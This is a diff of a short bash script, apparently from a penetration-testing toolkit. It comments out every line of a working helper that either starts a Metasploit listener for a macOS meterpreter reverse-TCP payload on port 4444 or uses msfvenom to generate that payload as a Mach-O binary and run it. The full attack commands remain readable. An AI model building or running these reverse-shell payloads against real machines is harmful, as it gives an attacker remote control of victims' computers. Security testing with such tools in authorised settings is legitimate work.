@@ -1,13 +1,13 @@
-#/bin/bash
+# #/bin/bash
 
-LHOST=$(getip)
+# LHOST=$(getip)
 
-if [ -z "$1" ]
-then
-   msfconsole -qx "use exploit/multi/handler; set payload osx/x64/meterpreter_reverse_tcp; set lhost $LHOST; set lport 4444; set ExitOnSession false; run -j"
-else
-   rm -f "$1"
-   msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f macho -o "$1"
-   chmod +x "$1"
-   "./$1"
-fi
+# if [ -z "$1" ]
+# then
+#    msfconsole -qx "use exploit/multi/handler; set payload osx/x64/meterpreter_reverse_tcp; set lhost $LHOST; set lport 4444; set ExitOnSession false; run -j"
+# else
+#    rm -f "$1"
+#    msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f macho -o "$1"
+#    chmod +x "$1"
+#    "./$1"
+# fi
